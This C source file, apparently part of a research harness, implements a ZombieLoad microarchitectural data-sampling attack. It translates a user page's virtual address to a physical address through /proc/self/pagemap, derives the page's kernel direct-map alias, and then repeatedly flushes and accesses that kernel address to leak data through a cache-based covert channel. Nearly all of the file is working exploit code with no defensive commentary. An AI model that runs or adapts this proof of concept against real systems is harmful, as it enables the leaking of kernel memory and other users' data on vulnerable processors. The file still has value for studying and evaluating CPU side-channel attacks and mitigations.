// evaluate the zombieload attack

#include "common.h"

#include <cpuid.h>
#include <pthread.h>
#include <stdint.h>
#include <string.h>
#include <sys/user.h>
#include <unistd.h>

// hardcoded base address of the direct-physical map
#define PAGE_OFFSET_BASE 0xffff888000000000

// convert virtual address to physical address
static uintptr_t virt_to_phys(uintptr_t virt) {
    // format documented at https://www.kernel.org/doc/html/latest/admin-guide/mm/pagemap.html
    FILE *f = fopen("/proc/self/pagemap", "r");
    ASSERT(f);
    // seek to given virtual address
    ASSERT(fseek(f, (virt >> 12) * 8, SEEK_SET) == 0);
    // read pagemap entry
    uint64_t entry;
    ASSERT(fread(&entry, sizeof entry, 1, f) == 1);
    fclose(f);

    // check that the page is present
    ASSERT((1ull << 63) & entry);
    // return physical address, computed from page frame number and page offset
    return ((entry & ((1ull << 55) - 1)) << 12) | (virt & 0xfff);
}

void attacker(void) {
    // prepare cache-based transmission channel
    transmit_t transmit;
    transmit_prepare(&transmit);

    // allocate target page in userspace
    page_t *target = mmap_pages(1);
    memset(target, 'A', PAGE_SIZE);

    // get physical address of target mapping
    uintptr_t target_phys = virt_to_phys((uintptr_t)target);
    ASSERT(target_phys != 0 && "Physical address could not be determined, start as root");

    // calculate kernel address mapped to the same physical memory as the target page
    uintptr_t target_direct = PAGE_OFFSET_BASE + target_phys;

    for (size_t i = 0; i < SAMPLE_COUNT; i++) {
        for (size_t j = 0; j < COUNTS_PER_SAMPLE; j++) {

            transmit_leak_start(&transmit);
            // flush the userspace address immediately before accessing the kernel address
            __builtin_ia32_clflush(target);
            // access kernel address to leak values
            leak_and_transmit(&transmit, (void *)target_direct);
            transmit_leak_end(&transmit);

            transmit_receive(&transmit);
        }
        transmit_decode(&transmit);
    }

    transmit_display(&transmit);
}
